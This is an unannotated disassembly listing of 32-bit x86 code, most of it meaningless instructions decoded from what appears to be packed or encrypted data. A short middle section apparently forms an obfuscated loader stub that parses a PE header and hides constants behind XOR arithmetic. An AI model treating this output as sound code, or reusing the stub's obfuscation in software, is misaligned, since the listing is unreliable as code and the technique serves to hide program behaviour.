  417958:	ins    BYTE PTR es:[edi],dx
  417959:	xor    DWORD PTR [eax+0x5b],ebx
  41795c:	rol    BYTE PTR [ebx-0x33e389f1],1
  417962:	das    
  417963:	sbb    dh,BYTE PTR [ecx+0x2b]
  417966:	and    edi,DWORD PTR ds:0xf90f20d1
  41796c:	inc    edx
  41796d:	jmp    0x58c968ef
  417972:	jns    0x417907
  417974:	mov    ah,0x50
  417976:	out    0xef,al
  417978:	gs out 0x36,al
  41797b:	mov    al,ds:0x55303d5f
  417980:	ss fwait
  417982:	add    edi,DWORD PTR [ebp+edx*8-0x2cb7aac5]
  417989:	sti    
  41798a:	ret    
  41798b:	jecxz  0x417953
  41798d:	nop
  41798e:	sbb    eax,0x664f4600
  417993:	dec    ecx
  417994:	dec    esi
  417995:	add    dl,BYTE PTR ds:0x57514ce4
  41799b:	ja     0x41792a
  41799d:	xchg   ebp,eax
  41799e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41799f:	mov    ebx,0x7c538c09
  4179a4:	sar    DWORD PTR ds:0x321eafdd,1
  4179aa:	lea    ecx,[edi-0x35]
  4179ad:	xor    ch,ah
  4179af:	test   DWORD PTR [edx],edx
  4179b1:	pop    es
  4179b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179b3:	sub    al,0x14
  4179b5:	push   ss
  4179b6:	push   ss
  4179b7:	adc    BYTE PTR [edi-0x27cf6e00],bh
  4179bd:	je     0x417962
  4179bf:	add    eax,DWORD PTR [edi-0x30]
  4179c2:	xor    al,0x8b
  4179c4:	fstp   QWORD PTR [eax+0x160682ec]
  4179ca:	mov    edi,0x85237db8
  4179cf:	xor    eax,0x1efa54e7
  4179d4:	stos   BYTE PTR es:[edi],al
  4179d5:	jbe    0x417a38
  4179d7:	fcomp  DWORD PTR [esi+0x68]
  4179da:	(bad)  
  4179db:	inc    DWORD PTR [ebx+0x15f454b5]
  4179e1:	mov    al,al
  4179e3:	dec    edi
  4179e4:	pushf  
  4179e5:	int    0xa9
  4179e7:	scas   al,BYTE PTR es:[edi]
  4179e8:	and    eax,0xced69f58
  4179ed:	std    
  4179ee:	xor    eax,0x2b7f1d41
  4179f3:	jo     0x417a38
  4179f5:	cli    
  4179f6:	loop   0x417983
  4179f8:	or     eax,DWORD PTR [edx+0x1dab3396]
  4179fe:	shl    ah,cl
  417a00:	rcr    DWORD PTR [eax],0xd0
  417a03:	add    eax,0xaa83e537
  417a08:	jle    0x417a38
  417a0a:	xchg   ebp,eax
  417a0b:	cmp    ebp,DWORD PTR [ebx-0x23cdcd80]
  417a11:	cmp    edx,DWORD PTR [edi]
  417a13:	test   BYTE PTR [ecx+0x165cc37b],dl
  417a19:	repz jmp 0x16f4:0x695c5efe
  417a21:	hlt    
  417a22:	pop    edx
  417a23:	inc    edx
  417a24:	adc    esi,esi
  417a26:	push   eax
  417a27:	jle    0x417a6e
  417a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a2a:	dec    eax
  417a2b:	mov    ch,0xcb
  417a2d:	xor    bl,BYTE PTR [bp+di]
  417a30:	dec    eax
  417a31:	or     eax,0x4f493092
  417a36:	xchg   esp,eax
  417a37:	push   es
  417a38:	js     0x417a7f
  417a3a:	or     ecx,eax
  417a3c:	mov    esp,fs
  417a3e:	inc    esp
  417a3f:	repz js 0x417a16
  417a42:	shl    BYTE PTR [ecx-0x16],1
  417a45:	inc    ecx
  417a46:	mov    esp,0xceb0690e
  417a4b:	jno    0x417a97
  417a4d:	mov    ecx,ds
  417a4f:	mov    esp,0xaa1dfe22
  417a54:	cmp    ch,ch
  417a56:	clc    
  417a57:	scas   eax,DWORD PTR es:[edi]
  417a58:	push   ebp
  417a59:	jp     0x417a2b
  417a5b:	push   ss
  417a5c:	or     al,0x44
  417a5e:	xchg   DWORD PTR [eax-0x5e],edx
  417a61:	fsub   QWORD PTR [eax-0x173f557f]
  417a67:	mov    edx,0xde1e8613
  417a6c:	aam    0x6
  417a6e:	(bad)  
  417a70:	scas   eax,DWORD PTR es:[edi]
  417a71:	and    DWORD PTR [edi+eiz*8-0x32],0xffffffae
  417a76:	shr    DWORD PTR [edx+0x8],0xf1
  417a7a:	cld    
  417a7b:	pop    edx
  417a7c:	std    
  417a7d:	mov    ecx,edi
  417a7f:	or     ebp,DWORD PTR [edx]
  417a81:	pop    ss
  417a82:	cwde   
  417a83:	push   esp
  417a84:	mov    ds:0x20afd597,eax
  417a89:	push   edi
  417a8a:	push   ss
  417a8b:	jae    0x417a38
  417a8d:	add    cl,al
  417a8f:	ins    DWORD PTR es:[edi],dx
  417a90:	or     al,0x5a
  417a92:	pop    edi
  417a93:	xchg   ebp,eax
  417a94:	inc    edx
  417a95:	outs   dx,DWORD PTR ds:[esi]
  417a96:	dec    edx
  417a97:	enter  0x3f83,0x4c
  417a9b:	pop    esi
  417a9c:	xchg   esi,eax
  417a9d:	mov    ds:0xdadb562c,al
  417aa2:	imul   bh
  417aa4:	or     dl,cl
  417aa6:	pop    edx
  417aa7:	push   edx
  417aa8:	cli    
  417aa9:	sub    esi,esi
  417aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aac:	dec    ebp
  417aad:	ss out dx,al
  417aaf:	arpl   WORD PTR [edx+0x28],si
  417ab2:	xor    eax,0x8701a1fc
  417ab7:	or     al,0x48
  417ab9:	mov    gs,eax
  417abb:	std    
  417abc:	dec    edx
  417abd:	xor    dh,cl
  417abf:	test   al,0xcf
  417ac1:	adc    ch,BYTE PTR [ecx+0x47]
  417ac4:	mov    BYTE PTR [esi-0x594f9dc1],bh
  417aca:	je     0x417aed
  417acc:	cld    
  417acd:	push   0xfffffff7
  417acf:	(bad)  
  417ad0:	xor    ebp,esp
  417ad2:	adc    eax,0xe783e097
  417ad7:	sub    al,BYTE PTR [esi+0x3d]
  417ada:	bnd ret 
  417adc:	jnp    0x417aac
  417ade:	pushf  
  417adf:	jle    0x417b4c
  417ae1:	sahf   
  417ae2:	dec    esp
  417ae3:	pop    esp
  417ae4:	pop    edx
  417ae5:	add    bh,BYTE PTR [ebx+0x16]
  417ae8:	pop    esp
  417ae9:	push   ecx
  417aea:	fdivr  DWORD PTR [ebx-0x80]
  417aed:	stc    
  417aee:	jle    0x417ac6
  417af0:	clc    
  417af1:	dec    edx
  417af2:	imul   eax,DWORD PTR [ebx-0x59],0x89141a6e
  417af9:	xchg   DWORD PTR [esi+edx*4-0x1cba14bf],ecx
  417b00:	xor    esp,DWORD PTR [edi]
  417b02:	jne    0x417a98
  417b04:	(bad)  
  417b05:	out    0xe8,eax
  417b07:	pop    ebx
  417b08:	sbb    DWORD PTR [esi],esp
  417b0a:	pusha  
  417b0b:	sub    DWORD PTR [edi-0x126466c7],ebx
  417b11:	xchg   ebp,eax
  417b12:	call   0x9f48e7f
  417b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b18:	xor    BYTE PTR [eax-0x53],dh
  417b1b:	jae    0x417b2c
  417b1d:	loopne 0x417adf
  417b1f:	inc    esi
  417b20:	fwait
  417b21:	dec    BYTE PTR [edi]
  417b23:	scas   al,BYTE PTR es:[edi]
  417b24:	pop    ebx
  417b25:	sar    BYTE PTR [eax-0x4e761378],cl
  417b2b:	push   cs
  417b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b2d:	retf   
  417b2e:	jbe    0x417b19
  417b30:	mov    ecx,0x5ff4ea2d
  417b35:	loope  0x417b70
  417b37:	jb     0x417b67
  417b39:	push   ds
  417b3a:	push   cs
  417b3b:	push   ss
  417b3c:	sub    dh,BYTE PTR [ecx]
  417b3e:	pop    edi
  417b3f:	adc    BYTE PTR [edi],bl
  417b41:	hlt    
  417b42:	xchg   ebp,eax
  417b43:	xchg   ebp,eax
  417b44:	jmp    DWORD PTR [edx+0x18ad3897]
  417b4a:	dec    esi
  417b4b:	mov    dh,0x12
  417b4d:	pop    ebx
  417b4e:	mov    al,0x5
  417b50:	dec    esi
  417b51:	dec    ecx
  417b52:	mov    edi,esi
  417b54:	ss mov ecx,0x28b7d5c4
  417b5a:	adc    ch,BYTE PTR [esi-0x30edbbeb]
  417b60:	adc    ecx,DWORD PTR [esp+ebx*2-0x78]
  417b64:	inc    ebx
  417b65:	xor    BYTE PTR [edx-0x5429b39e],dl
  417b6b:	jg     0x417b66
  417b6d:	in     al,0xf5
  417b6f:	mov    BYTE PTR [ebx-0x4c065bc3],ah
  417b75:	add    ebp,edi
  417b77:	and    DWORD PTR [ebx-0x29],ecx
  417b7a:	aam    0x39
  417b7c:	adc    ebx,edx
  417b7e:	push   ebx
  417b7f:	ret    0x104d
  417b82:	or     eax,0x3f8f4880
  417b87:	test   BYTE PTR [edi-0x49],al
  417b8a:	mov    eax,ds:0x7ffed485
  417b8f:	fld    QWORD PTR [esi-0xa27eddd]
  417b95:	in     al,dx
  417b96:	mov    esi,DWORD PTR [eax+0x58cd611a]
  417b9c:	mov    ebp,0x50f5301b
  417ba1:	lods   eax,DWORD PTR ds:[esi]
  417ba2:	push   edx
  417ba3:	(bad)  
  417ba4:	imul   edx,DWORD PTR [esp+esi*2+0x523613ad],0x9
  417bac:	or     al,0xf3
  417bae:	inc    DWORD PTR [edi+0x52442507]
  417bb4:	and    al,0xbd
  417bb6:	adc    ecx,DWORD PTR [esi]
  417bb8:	cli    
  417bb9:	ins    BYTE PTR es:[edi],dx
  417bba:	pop    ss
  417bbb:	jo     0x417bac
  417bbd:	mov    edi,0x61bff4c2
  417bc2:	push   ds
  417bc3:	pop    ebx
  417bc4:	daa    
  417bc5:	stc    
  417bc6:	push   esi
  417bc7:	mov    ebp,DWORD PTR [eax-0x38e7ca8d]
  417bcd:	imul   ebx,DWORD PTR [eax+0x4c165abf],0x3a3a5e78
  417bd7:	xchg   DWORD PTR [edi+0x6293d1a4],esi
  417bdd:	sub    edi,DWORD PTR [ebx-0x4]
  417be0:	mov    ds:0xa754577e,eax
  417be5:	es rol ebp,0x91
  417be9:	jge    0x417bdc
  417beb:	and    ebp,0x13
  417bee:	(bad)  
  417bef:	and    bl,ch
  417bf1:	out    0x1f,al
  417bf3:	ja     0x417bdf
  417bf5:	ins    DWORD PTR es:[edi],dx
  417bf6:	pop    DWORD PTR [ecx-0x50]
  417bf9:	popa   
  417bfa:	push   ss
  417bfb:	add    ebx,DWORD PTR [edi]
  417bfd:	sub    eax,0xe0ea807d
  417c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c03:	and    BYTE PTR [ecx],cl
  417c05:	or     eax,0x6551377
  417c0a:	lahf   
  417c0b:	ret    0xe2fe
  417c0e:	pop    edx
  417c0f:	mov    ch,0xd1
  417c11:	mov    edi,0x42834b48
  417c16:	cmp    dh,BYTE PTR [edi+0x13fffe03]
  417c1c:	jbe    0x417c1a
  417c1e:	adc    DWORD PTR [ebx+ecx*1+0x40],esp
  417c22:	adc    bl,BYTE PTR [edi+0x21be1157]
  417c28:	add    cl,cl
  417c2a:	jmp    0x8a8bcf76
  417c2f:	les    ecx,FWORD PTR ss:[ebp-0x1afac0c2]
  417c36:	jmp    0xf5ac:0x868ef633
  417c3d:	dec    ecx
  417c3e:	(bad)  
  417c40:	test   ecx,0x62e6331a
  417c46:	dec    ebp
  417c47:	lock outs dx,DWORD PTR ds:[esi]
  417c49:	fistp  QWORD PTR ds:0x49ba4aa9
  417c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c50:	hlt    
  417c51:	cs cmp esi,edi
  417c54:	jg     0x417ca0
  417c56:	dec    ecx
  417c57:	pusha  
  417c58:	sub    eax,0xe1c0ff30
  417c5d:	out    dx,eax
  417c5e:	push   ss
  417c5f:	jl     0x417c51
  417c61:	in     eax,dx
  417c62:	(bad)  
  417c63:	push   esp
  417c64:	outs   dx,BYTE PTR ds:[esi]
  417c65:	fldenv [edi+eax*4]
  417c68:	mov    dh,0x7e
  417c6a:	adc    DWORD PTR [esi+0x1e1fa253],ebp
  417c70:	cwde   
  417c71:	popf   
  417c72:	xchg   ebx,eax
  417c74:	imul   esi,DWORD PTR [ecx+0xc],0x80be39a
  417c7b:	dec    esi
  417c7c:	inc    edx
  417c7d:	ins    BYTE PTR es:[edi],dx
  417c7e:	xchg   ebp,eax
  417c7f:	mul    BYTE PTR [esi-0x1e1517f3]
  417c85:	or     BYTE PTR [ebp-0x35],bl
  417c88:	sbb    DWORD PTR [edi],esp
  417c8a:	repnz bnd jmp 0x9085a575
  417c91:	faddp  st(4),st
  417c93:	fldcw  WORD PTR [eax-0x11]
  417c96:	adc    eax,0xb23692e9
  417c9b:	or     ebp,DWORD PTR [esi-0x17d3b018]
  417ca1:	into   
  417ca2:	popa   
  417ca3:	mov    eax,0x601030fa
  417ca8:	dec    ecx
  417ca9:	adc    DWORD PTR [eax],esp
  417cab:	xor    eax,0x18f97edd
  417cb0:	inc    edi
  417cb1:	xchg   ecx,eax
  417cb2:	push   ds
  417cb3:	lods   eax,DWORD PTR ds:[esi]
  417cb4:	dec    edi
  417cb5:	push   0xf
  417cb7:	lahf   
  417cb8:	hlt    
  417cb9:	pop    eax
  417cba:	gs daa 
  417cbc:	ret    
  417cbd:	sbb    bh,ch
  417cbf:	sub    DWORD PTR [ebp+ebp*1+0x45],ebp
  417cc3:	mov    ds:0x33b5024b,al
  417cc8:	shr    DWORD PTR [esi+ecx*4+0x68],0xbe
  417ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cce:	mov    BYTE PTR [edx+0x7af78461],bh
  417cd4:	xchg   edx,ecx
  417cd6:	fisub  WORD PTR [ecx]
  417cd8:	pop    ebp
  417cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cda:	rol    eax,0x13
  417cdd:	adc    eax,0x9da8cafd
  417ce2:	test   DWORD PTR [ecx-0x3dcd3183],ebx
  417ce8:	xchg   ebp,eax
  417ce9:	adc    DWORD PTR [ebp+0xf87d2b3],edi
  417cef:	scas   eax,DWORD PTR es:[edi]
  417cf0:	dec    ecx
  417cf1:	mov    cl,dh
  417cf3:	jmp    0x8f9cb7cc
  417cf8:	lea    ebp,[ebx-0x6]
  417cfb:	shr    BYTE PTR [edi],1
  417cfd:	fmul   st(1),st
  417cff:	sbb    esp,ecx
  417d01:	pop    eax
  417d02:	jg     0x417cce
  417d04:	inc    edi
  417d05:	loopne 0x417d0f
  417d07:	jp     0x417d26
  417d09:	or     DWORD PTR [edi],esp
  417d0b:	fst    QWORD PTR [ebp-0x5]
  417d0e:	cmp    BYTE PTR [edx],ch
  417d10:	pusha  
  417d11:	in     eax,0xe0
  417d13:	pop    ss
  417d14:	sub    eax,0xc649c488
  417d19:	dec    ecx
  417d1a:	xchg   esi,eax
  417d1b:	push   es
  417d1c:	push   ecx
  417d1d:	popf   
  417d1e:	call   0x2411:0x56bb7d21
  417d25:	(bad)  
  417d26:	jbe    0x417d0d
  417d28:	xor    BYTE PTR [ecx+0x1a],0x1f
  417d2c:	mov    al,0xdf
  417d2e:	in     al,dx
  417d2f:	mov    ch,0x61
  417d31:	fstp   TBYTE PTR [eax]
  417d33:	rcr    BYTE PTR [ebx-0x2ed08121],1
  417d39:	and    ebp,ecx
  417d3b:	jne    0x417d5f
  417d3d:	mov    ds:0x6c9ae691,al
  417d42:	stc    
  417d43:	jae    0x417d02
  417d45:	jp     0x417d54
  417d47:	ret    
  417d48:	hlt    
  417d49:	pop    ds
  417d4a:	(bad)  
  417d4b:	in     eax,0xf
  417d4d:	add    eax,0xc09fda90
  417d52:	(bad)  
  417d53:	push   eax
  417d54:	adc    ecx,DWORD PTR [edx+0x6f555397]
  417d5a:	ins    DWORD PTR es:[edi],dx
  417d5b:	lock in eax,0x76
  417d5e:	dec    eax
  417d5f:	mov    esp,0xd7301a54
  417d64:	adc    eax,0x1360e804
  417d69:	jg     0x417d10
  417d6b:	cwde   
  417d6c:	call   0xec6d:0x3a4c7224
  417d73:	and    al,0xee
  417d75:	shr    DWORD PTR [ebx-0x46],1
  417d78:	pusha  
  417d79:	adc    DWORD PTR [edi-0x57],0x2d07926d
  417d80:	cmp    DWORD PTR [ebx+0x6a9e8581],0x69
  417d87:	pop    eax
  417d88:	and    DWORD PTR ds:0xeb9fe309,ecx
  417d8e:	dec    esp
  417d8f:	or     BYTE PTR [ebx-0x2d],bl
  417d92:	stc    
  417d93:	mov    cl,0x60
  417d95:	ror    DWORD PTR [ebx],1
  417d97:	jmp    0x417d8d
  417d99:	fucom  st(1)
  417d9b:	lods   al,BYTE PTR ds:[esi]
  417d9c:	and    BYTE PTR ds:0xe1d619f7,bh
  417da2:	shl    DWORD PTR [edx-0x46cd4659],cl
  417da8:	out    0x27,eax
  417daa:	dec    edi
  417dab:	imul   esi,DWORD PTR [ebx+0x66],0x21af03d4
  417db2:	lds    ebp,FWORD PTR [ebx-0x39124b67]
  417db8:	mov    WORD PTR [edi],fs
  417dba:	movhps xmm1,QWORD PTR [ecx]
  417dbd:	adc    edx,DWORD PTR [ebp-0x7bf29b2e]
  417dc3:	jmp    DWORD PTR [edx+0x51]
  417dc6:	sbb    eax,0xb544632c
  417dcb:	adc    DWORD PTR [ebx],edi
  417dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dce:	repz xor eax,0xd6a40b82
  417dd4:	fstp   TBYTE PTR [edi+0x5a]
  417dd7:	rol    BYTE PTR [ebp+esi*8-0x67],cl
  417ddb:	mov    edx,0x95d157b3
  417de0:	fld    DWORD PTR [ebp-0x21]
  417de3:	push   ebx
  417de4:	ror    BYTE PTR [ecx+ebp*1],1
  417de7:	ins    DWORD PTR es:[edi],dx
  417de8:	mov    eax,ds:0xf7eca0ef
  417ded:	jg     0x417e35
  417def:	test   BYTE PTR [eax-0xf7f6bc9],0x94
  417df6:	add    DWORD PTR [ecx+0x12],esp
  417df9:	clc    
  417dfa:	xchg   DWORD PTR [ebp+0x56],esi
  417dfd:	fidivr DWORD PTR [eax+eiz*4+0x68d51394]
  417e04:	shl    BYTE PTR [ecx],0xde
  417e07:	jl     0x417e1a
  417e09:	mov    ebp,0xb87da342
  417e0e:	inc    ebx
  417e0f:	fst    DWORD PTR [edi-0x65]
  417e12:	push   edi
  417e13:	push   0x21a0722e
  417e18:	mov    edi,0xa9290df
  417e1d:	shl    DWORD PTR [ebx+0x1],cl
  417e20:	retf   0xf39d
  417e23:	fsub   st(2),st
  417e25:	imul   eax,ecx,0xffffffab
  417e28:	inc    edi
  417e29:	fisubr WORD PTR [eax-0x6a]
  417e2c:	popa   
  417e2d:	sti    
  417e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e2f:	pop    ecx
  417e30:	jae    0x417e01
  417e32:	and    eax,DWORD PTR [eax-0x1098877f]
  417e38:	or     al,0x8
  417e3a:	sahf   
  417e3b:	jo     0x417e08
  417e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e3e:	lods   eax,DWORD PTR ds:[esi]
  417e3f:	repz shr DWORD PTR [ecx+esi*8],1
  417e43:	mov    esi,0xb21eeb0a
  417e48:	lods   eax,DWORD PTR ds:[esi]
  417e49:	xchg   esi,eax
  417e4a:	xchg   esi,eax
  417e4b:	push   edi
  417e4c:	push   edx
  417e4d:	ror    DWORD PTR [ebp-0x1a],1
  417e50:	add    ebp,ecx
  417e52:	daa    
  417e53:	stos   DWORD PTR es:[edi],eax
  417e54:	or     DWORD PTR [edx-0x2],edi
  417e57:	sub    eax,0xe141a6ee
  417e5c:	sub    al,0xf2
  417e5e:	push   edx
  417e5f:	pusha  
  417e60:	sub    bh,BYTE PTR [esp+esi*1+0x359f1957]
  417e67:	in     al,dx
  417e68:	mov    ch,0xb8
  417e6a:	loope  0x417e13
  417e6c:	in     al,dx
  417e6d:	lea    ebp,[edx+eiz*2+0x7deee98e]
  417e74:	retf   
  417e75:	je     0x417ec0
  417e77:	pop    eax
  417e78:	adc    cl,BYTE PTR [edx+esi*8]
  417e7b:	xchg   edx,eax
  417e7c:	loop   0x417e74
  417e7e:	cmp    al,BYTE PTR [esi-0x24]
  417e81:	gs fdivp st(2),st
  417e84:	out    0x3c,eax
  417e86:	jo     0x417ebd
  417e88:	outs   dx,BYTE PTR ds:[esi]
  417e89:	ds loop 0x417e61
  417e8c:	sar    DWORD PTR [eax],0xfd
  417e8f:	mul    BYTE PTR [edi-0x42287ab0]
  417e95:	mov    ah,0xa1
  417e97:	fmul   QWORD PTR [ebx-0xe]
  417e9a:	aad    0x3e
  417e9c:	ds ja  0x417ecd
  417e9f:	imul   esp,DWORD PTR ds:0x1305eba8,0x71fc305d
  417ea9:	dec    ebx
  417eaa:	sbb    BYTE PTR [edi+0x73],dl
  417ead:	cmp    DWORD PTR [esi+0xb],ebp
  417eb0:	cmp    BYTE PTR [esi+0x4e02dec3],0x99
  417eb7:	jbe    0x417e84
  417eb9:	add    eax,0x3a0eb6d8
  417ebe:	jne    0x417e91
  417ec0:	inc    esi
  417ec1:	imul   edi,DWORD PTR [edi-0x863cf43],0xdcfab6d7
  417ecb:	sbb    al,0xad
  417ecd:	out    dx,al
  417ece:	pop    ecx
  417ecf:	jne    0x417eae
  417ed1:	retfw  
  417ed3:	inc    esp
  417ed4:	push   ds
  417ed5:	xchg   edi,eax
  417ed6:	push   0xffffff99
  417ed8:	lea    ecx,[ebx]
  417eda:	mov    eax,ds:0x1f13c592
  417edf:	xor    al,0xb9
  417ee1:	mov    WORD PTR ds:0xb596d66b,cs
  417ee7:	mov    eax,0xf36a88af
  417eec:	xlat   BYTE PTR ds:[ebx]
  417eed:	push   0xffffffed
  417eef:	sub    al,0x78
  417ef1:	lds    ecx,FWORD PTR [ebx]
  417ef3:	fst    QWORD PTR [ebp-0x3127b354]
  417ef9:	or     eax,0xc8c6ab49
  417efe:	pop    edi
  417eff:	sbb    DWORD PTR [edx],edi
  417f01:	inc    edi
  417f02:	int3   
  417f03:	adc    eax,ebx
  417f05:	shl    dl,1
  417f07:	cmc    
  417f08:	(bad)  
  417f09:	cli    
  417f0a:	lahf   
  417f0b:	push   0xc46bd7cd
  417f10:	lds    esi,FWORD PTR [ebx+edx*8-0x49]
  417f14:	cmp    eax,ebx
  417f16:	data16 or BYTE PTR [ebx-0x521ed4b],cl
  417f1d:	cli    
  417f1e:	rcr    BYTE PTR [eax],cl
  417f20:	in     al,0xfb
  417f22:	jne    0x417ee5
  417f24:	mov    al,BYTE PTR [eax]
  417f26:	add    DWORD PTR ds:0x429004,0x244e
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x41fffb
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d25c
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	mov    edi,0xfdeb01a1
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x24]
  418120:	or     DWORD PTR [esi],ebp
  418122:	mov    ch,0x5f
  418124:	ja     0x4180c1
  418126:	je     0x4180aa
  418128:	les    edx,FWORD PTR [ebp+0x23d0c1d0]
  41812e:	dec    edi
  41812f:	xor    edi,DWORD PTR [edi-0x57fa9117]
  418135:	push   0xffffffd6
  418137:	dec    edx
  418138:	cdq    
  418139:	mov    bh,0xf4
  41813b:	and    ah,BYTE PTR [ebp-0x2926011e]
  418141:	stos   DWORD PTR es:[edi],eax
  418142:	xor    BYTE PTR gs:[ecx+0x5b],ah
  418146:	xor    dl,BYTE PTR [ecx-0x25ec6560]
  41814c:	mov    dl,0xb5
  41814e:	mov    ds:0x4413da4d,al
  418153:	cwde   
  418154:	(bad)  
  418155:	shl    ch,1
  418157:	test   al,0xb4
  418159:	popf   
  41815a:	lods   al,BYTE PTR ds:[esi]
  41815b:	fimul  WORD PTR ds:0x2b4b8171
  418161:	ret    
  418162:	jne    0x41813e
  418164:	imul   ebp,DWORD PTR [edi+ebx*1-0x1c2dee3f],0xf814eafa
  41816f:	pop    ebx
  418170:	fwait
  418171:	mov    bl,0x46
  418173:	mov    bh,0x6d
  418175:	outs   dx,BYTE PTR ds:[esi]
  418176:	gs mov bh,0x44
  418179:	jp     0x4181a4
  41817b:	mov    esp,0x6c984453
  418180:	jns    0x4181df
  418182:	fst    QWORD PTR [edx+edx*4+0x54a4717d]
  418189:	loop   0x41813a
  41818b:	in     al,dx
  41818c:	icebp  
  41818d:	jnp    0x418141
  41818f:	mov    al,ds:0xdc89befe
  418194:	jg     0x418172
  418196:	retf   
  418197:	sti    
  418198:	pop    ebx
  418199:	mov    al,ds:0x1de0e2b1
  41819e:	ret    0x22d1
  4181a1:	sub    eax,0x13947b6d
  4181a6:	adc    esi,DWORD PTR [eax]
  4181a8:	lahf   
  4181a9:	mov    cl,0xb
  4181ab:	sbb    esi,DWORD PTR [edi]
  4181ad:	(bad)  
  4181ae:	pop    ebp
  4181af:	out    dx,eax
  4181b0:	xchg   BYTE PTR [ebp+0x57c04198],bl
  4181b6:	sub    eax,0xacf680d2
  4181bb:	scas   eax,DWORD PTR es:[edi]
  4181bc:	not    DWORD PTR gs:[edi]
  4181bf:	adc    DWORD PTR cs:[ecx],edx
  4181c2:	bound  edx,QWORD PTR [edx+0x6]
  4181c5:	fwait
  4181c6:	in     al,0x77
